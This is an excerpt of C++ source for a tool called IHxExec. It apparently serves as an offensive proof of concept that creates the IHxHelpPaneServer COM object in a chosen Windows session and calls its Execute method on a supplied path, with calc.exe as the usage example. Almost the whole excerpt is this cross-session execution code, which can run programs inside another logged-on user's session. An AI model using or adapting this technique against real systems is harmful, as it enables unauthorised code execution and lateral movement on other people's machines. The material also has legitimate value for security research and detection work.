...
void ShowHelp()
{
    ...
    std::wcerr << L"Example: IHxExec.exe -s 1 -c C:/Windows/System32/calc.exe" << std::endl;
}
...
int wmain(int argc, wchar_t* argv[])
{
    ...
    if (FAILED(hr))
    {
        std::wcout << L"[-] Cant get IStandardActivator" << std::endl;
        return Win32FromHResult(hr);
    }
    ...
    std::wcout << L"[*] Spawning COM object in session: " << session << std::endl;
    ...
    if (FAILED(hr))
    {
        std::wcout << L"[-] StandardCreateInstance failed" << std::endl;
        return Win32FromHResult(hr);
    }

    IHxHelpPaneServer* pIHxHelpPaneServer = static_cast<IHxHelpPaneServer*>(qis[0].pItf);

    std::wcout << L"[+] Executing: " << pcUrl << std::endl;
    hr = pIHxHelpPaneServer->Execute(pcUrl);
    if (FAILED(hr))
    {
        std::wcout << L"[-] Execute() failed" << std::endl;
        return Win32FromHResult(hr);
    }

    if (pComAct) pComAct->Release();
    if (pSpecialProperties) pSpecialProperties->Release();
    if (pIHxHelpPaneServer) pIHxHelpPaneServer->Release();
